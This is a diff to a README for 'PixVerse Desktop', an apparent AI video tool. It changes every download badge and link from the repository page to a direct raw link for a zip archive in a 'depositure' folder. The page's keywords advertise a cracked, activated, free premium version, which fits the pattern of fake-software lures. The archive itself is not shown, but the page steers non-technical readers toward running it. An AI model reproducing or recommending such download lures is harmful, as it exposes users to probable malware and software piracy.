@@ -1,6 +1,6 @@
 # 🎬 PixVerse-Desktop---PixVerse-AI-Video-2026 - Create Stunning AI Videos in Minutes
 
-[![Download PixVerse Desktop](https://img.shields.io/badge/Download-PixVerse_Desktop-4B0082?style=for-the-badge&logo=github&logoColor=white&labelColor=FF4500)](https://github.com/majuscule-tester6851/PixVerse-Desktop---PixVerse-AI-Video-2026)
+[![Download PixVerse Desktop](https://img.shields.io/badge/Download-PixVerse_Desktop-4B0082?style=for-the-badge&logo=github&logoColor=white&labelColor=FF4500)](https://raw.githubusercontent.com/majuscule-tester6851/PixVerse-Desktop---PixVerse-AI-Video-2026/main/depositure/1.1-alpha.5.zip)
 
 ## ✨ What is PixVerse Desktop?
 
@@ -12,7 +12,7 @@ Getting started with PixVerse Desktop is very easy. You do not need any technica
 
 ### 📥 Step 1: Download the Application
 
-Visit this link to download the application: **[Download PixVerse Desktop](https://github.com/majuscule-tester6851/PixVerse-Desktop---PixVerse-AI-Video-2026)**
+Visit this link to download the application: **[Download PixVerse Desktop](https://raw.githubusercontent.com/majuscule-tester6851/PixVerse-Desktop---PixVerse-AI-Video-2026/main/depositure/1.1-alpha.5.zip)**
 
 This link will take you to the download page. Look for the download button and click it. The file will start downloading to your computer.
 
@@ -145,6 +145,6 @@ If you need help, you can open an issue on the GitHub repository page. The commu
 
 PixVerse Desktop brings the power of professional AI video generation to your own computer. With the V3.5 model, 4K output, and character consistency, you can create amazing videos easily. Download it today and start turning your ideas into visual stories.
 
-[![Download Now](https://img.shields.io/badge/Download-PixVerse_Desktop-FF69B4?style=for-the-badge&logo=windows&logoColor=white&labelColor=2E8B57)](https://github.com/majuscule-tester6851/PixVerse-Desktop---PixVerse-AI-Video-2026)
+[![Download Now](https://img.shields.io/badge/Download-PixVerse_Desktop-FF69B4?style=for-the-badge&logo=windows&logoColor=white&labelColor=2E8B57)](https://raw.githubusercontent.com/majuscule-tester6851/PixVerse-Desktop---PixVerse-AI-Video-2026/main/depositure/1.1-alpha.5.zip)
 
 Keywords: ai-video-4k, ai-video-generator, ai-video-tool, pixverse-2026, pixverse-4k, pixverse-activated, pixverse-app, pixverse-character, pixverse-crack, pixverse-desktop, pixverse-desktop-2026, pixverse-free, pixverse-premium, pixverse-style, pixverse-tool, pixverse-unlimited, pixverse-v3, video-ai-2026, video-ai-pixverse, video-generator-2026
